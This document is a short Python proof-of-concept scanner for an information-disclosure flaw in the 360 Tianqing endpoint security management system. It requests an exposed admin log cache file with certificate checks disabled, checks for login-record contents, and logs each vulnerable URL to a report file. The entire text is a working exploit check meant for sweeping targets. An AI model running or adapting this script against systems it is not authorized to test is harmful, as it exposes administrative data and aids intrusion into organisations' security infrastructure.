import requests
import time
import wirtefile
import buter

filename = "./reps/三六零新天擎终端安全管理系统信息泄露-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc ='/runtime/admin_log_conf.cache'
def ntqinfoleak(url):
    try:
        rep = requests.get(url=url+poc,headers=headers,verify=False,timeout=3)
        if rep.status_code==200 and 's:4:"name";s:6:"登录"' in rep.text:
            print(buter.colors.GREEN + f"存在三六零新天擎终端安全管理系统信息泄露 url : {url}{poc}" + buter.colors.END)
            reptext = f"{url}{poc}"
            wirtefile.writefiles(filename,reptext)

        else:
            print(buter.colors.RED + f"未发现三六零新天擎终端安全管理系统信息泄露 url : {url}"+ buter.colors.END)
    except Exception as e:
        print(buter.colors.END+ f"ERROR : {e}"+ buter.colors.END)